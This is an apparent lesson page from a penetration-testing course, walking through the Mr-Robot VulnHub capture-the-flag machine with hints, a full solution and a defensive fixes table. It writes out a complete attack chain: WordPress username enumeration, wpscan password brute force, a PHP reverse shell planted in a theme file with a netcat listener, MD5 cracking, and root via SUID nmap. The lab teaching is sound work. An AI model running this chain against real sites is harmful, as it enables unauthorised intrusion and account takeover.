# Machine 7 — Mr-Robot: 1

> **Position:** 7 of 13 · the midpoint · **Band 3 — Easy** (global rank **053** of 708)
> **Full writeup:** [`labs/3-053-mr-robot-1/README.md`](../../labs/3-053-mr-robot-1/README.md)

| | |
| --- | --- |
| **Machine** | Mr-Robot: 1 |
| **Author** | Leon Johnson |
| **Released** | 28 June 2016 |
| **Target** | Ubuntu 14.04, Apache + **WordPress** |
| **VulnHub** | [entry/mr-robot-1,151](https://vulnhub.com/entry/mr-robot-1,151/) |
| **Flags** | 3 keys |
| **Estimated time** | 4–6 hours |

---

## Why this machine is here

It is the best available demonstration of **content discovery** — the discipline of
finding the files a site has that its homepage does not link to. And it hands you the
most generous gift any CTF author has ever given: the site publishes **its own
password wordlist** in `robots.txt`.

It is also your first **username oracle**: WordPress tells you whether a username
exists by returning a *different error message*, which halves the brute-force search
space before you send a single password guess.

And it ends on a technique worth understanding deeply: **cracking an unsalted MD5
hash found in a home directory**, then a SUID escalation through a binary you would
never expect (`nmap`).

## Learning objectives

1. Treat **`robots.txt`** as the first file you read on any website, and explain why
   it is not a security control.
2. Do **content discovery** with `dirb`/`gobuster`/`ffuf`, and interpret a 200 that
   looks like a dead end.
3. Understand and exploit a **username enumeration oracle** in a login form.
4. **Clean and de-duplicate a wordlist** before using it — and know why the raw
   858,160-line `fsocity.dic` is unusable as-is.
5. Turn WordPress **Administrator** access into code execution via the **Theme Editor**.
6. Upgrade a raw netcat shell to a **PTY**, specifically because `su` will not work
   otherwise.
7. Identify an **unsalted MD5** hash by its length, and crack it with John.
8. Escalate via **SUID `nmap` 3.81**'s `--interactive` mode.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Sensitive file disclosure** | `robots.txt` → `fsocity.dic` + `key-1-of-3.txt` |
| **Content discovery** | `dirb` against a themed WordPress front end |
| **Username enumeration** | `wp-login.php` verbose errors + `wpscan -e u` → `elliot` |
| **Dictionary attack with a leaked list** | `wpscan -U elliot -P fsocity-clean.dic` → `ER28-0652` |
| CMS admin → RCE | Appearance → Editor → **`404.php`** → PHP reverse shell as `daemon` |
| **Weak password storage** | `/home/robot/password.raw-md5`, unsalted MD5 |
| Offline cracking | `john --format=Raw-MD5` → `abcdefghijklmnopqrstuvwxyz` |
| User pivot | `su robot` (needs a real TTY) |
| **SUID shell escape** | `/usr/local/bin/nmap` **3.81** → `--interactive` → `!sh` |

## Read first

- [02 — Web Attacks](../02-Web-Attacks.md) **§3** (content discovery and wordlists)
  and **§7** (WordPress and `wpscan`).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§1**
  (recognising a 32-hex-char MD5), **§2** (wordlist hygiene) and **§4** (John).
- [06 — Shells, Persistence and Escapes](../06-Shells-Persistence-and-Escapes.md)
  **§2** — the TTY upgrade is *mandatory* on this box, not cosmetic.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) §2.

## Before you start — answer these

1. What is `robots.txt` for, and why is putting a secret in it equivalent to
   publishing the secret?
2. A wordlist has 858,160 lines. What is your first action before using it, and why?
3. How can a login form tell you a username is valid without ever accepting a login?
4. What is the difference between **salted** and **unsalted** hashing, and why does
   unsalted make cracking dramatically easier?
5. Why will `su` fail in a raw netcat shell but work after a PTY upgrade?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

The homepage is a themed fake IRC terminal. It is a **dead end**. Do not spend time on it.

Instead, ask: what is the very first file every web enumerator checks? It is a
convention file at the site root, and here it contains two entries — one of which is
a **dictionary**.

Then work out what CMS is running. The scan and the HTML will tell you.
</details>

<details>
<summary><strong>Rung 2 — what you find</strong></summary>

```bash
curl http://TARGET/robots.txt
```
```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Key 1** is right there. And `fsocity.dic` is a **wordlist the site publishes**:

```bash
wget http://TARGET/fsocity.dic
wc -l fsocity.dic              # 858160
sort -u fsocity.dic > fsocity-clean.dic
wc -l fsocity-clean.dic        # 11451   <- the same data, 75x smaller
```

Now enumerate WordPress users:

```bash
wpscan --url http://TARGET/ -e u
```
→ **`elliot`**.
</details>

<details>
<summary><strong>Rung 3 — the credential</strong></summary>

WordPress returns *"Invalid username"* versus *"The password you entered is
incorrect"* — a username oracle. You already have the username, so attack the
password with the site's own list:

```bash
wpscan --url http://TARGET/ -U elliot -P fsocity-clean.dic
```
```text
[SUCCESS] - elliot / ER28-0652
```

Log in. `elliot` is an **Administrator**, which means the **Appearance → Editor**
menu is available.
</details>

<details>
<summary><strong>Rung 4 — the shell and the pivot</strong></summary>

In Appearance → Editor, select the theme file **`404.php`**, replace its contents
with a PHP reverse shell, save, then trigger it by requesting a URL that does not
exist:

```bash
nc -lvnp 4444                                   # listener FIRST
curl http://TARGET/this-pagedoes-not-exist      # fires the 404 template
```

You land as **`daemon`** (uid=1). **Upgrade the TTY before continuing** — `su` will
not prompt correctly in a raw shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then locally: stty raw -echo; fg
```

`/home/robot` holds `key-2-of-3.txt` (`-r--------`, robot only) and
**`password.raw-md5`** (`-rw-r--r--`, world-readable):

```bash
cat password.raw-md5        # robot:c3fcd3d76192e4007dfb496cca67e13b
```

32 hex characters = **unsalted MD5**. On your attack box:

```bash
echo 'robot:c3fcd3d76192e4007dfb496cca67e13b' > robot.hash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt robot.hash
# -> abcdefghijklmnopqrstuvwxyz
```

`su robot` → `cat key-2-of-3.txt`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → **80** and **443** open; 22 closed. Themed WordPress site.
2. **`robots.txt`** → `fsocity.dic` (**key 1** is `key-1-of-3.txt`) — the site leaks
   its own password dictionary (858,160 lines → **11,451** unique).
3. `wpscan -e u` → **`elliot`**; verbose login errors confirm it.
4. `wpscan -U elliot -P fsocity-clean.dic` → **`ER28-0652`** → Administrator.
5. **Theme Editor** → `404.php` → PHP reverse shell → **`daemon`** → TTY upgrade.
6. `/home/robot/password.raw-md5` → unsalted MD5 → John → **`abcdefghijklmnopqrstuvwxyz`**
   → `su robot` → **key 2**.
7. `find / -perm -4000` → **`/usr/local/bin/nmap` 3.81**, SUID root →
   `nmap --interactive` then **`!sh`** → `uid=1002(robot) euid=0(root)` →
   **key 3** at `/root/key-3-of-3.txt`.
</details>

## After you finish — review questions

1. Why did you de-duplicate `fsocity.dic`? What would have happened if you had run
   the raw list through `wpscan`?
2. Describe the username oracle precisely. What is the *minimal* change to WordPress
   that closes it?
3. `password.raw-md5` was world-readable. Was the world-readable bit the
   vulnerability, or was the MD5? Argue both.
4. Unsalted MD5 cracks in seconds. Roughly how much slower would the same password be
   under bcrypt, and why?
5. The password was `abcdefghijklmnopqrstuvwxyz`. Why did a **dictionary attack**
   find it when it is not in `rockyou.txt` in that form? Think about what the list
   actually contained.
6. Why is SUID on `nmap` a vulnerability while SUID on `passwd` is not? What property
   of `nmap` 3.81 specifically made it exploitable, and what changed in later
   versions?
7. The 404 page ran PHP. What is the correct way to serve a "not found" page, and why
   does a template editor in a CMS constitute an RCE feature by design?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| `robots.txt` leaks `fsocity.dic` and a key | `robots.txt` is public. Move secrets behind authentication; never publish a wordlist |
| Username enumeration on `wp-login.php` | Return an identical generic message for both failure modes; add rate limiting and lockout |
| `elliot : ER28-0652` | Enforce a strong-password policy; add 2FA for all admin accounts; alert on high-volume login failures |
| Administrator can edit theme PHP | **This is a feature.** Restrict `unfiltered_html`/`edit_themes` capabilities; disable file editing with `define('DISALLOW_FILE_EDIT', true);` |
| `password.raw-md5` unsalted MD5 | Use bcrypt/argon2 with a per-user salt. Never store unsalted MD5 |
| World-readable credential file in `/home` | `chmod 600`; audit home directories for world-readable files |
| **SUID `nmap` 3.81** | `chmod u-s`. Remove `--interactive` exposure by upgrading nmap (later versions dropped it). Audit SUID against the stock set |
| Web server allowed outbound connections | Egress-filter; a PHP reverse shell should not reach the internet |

**The single biggest lesson:** *a CMS administrator is already root on the web tier.*
Theme and plugin editors exist to run PHP. If you grant admin, you have granted code
execution — so admin accounts need the same protection as server credentials.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 6 — bossplayersCTF: 1](06-bossplayersctf-1.md) · next: [Machine 8 — Empire: Breakout](08-empire-breakout.md) · full writeup: [`labs/3-053-mr-robot-1`](../../labs/3-053-mr-robot-1/README.md)._
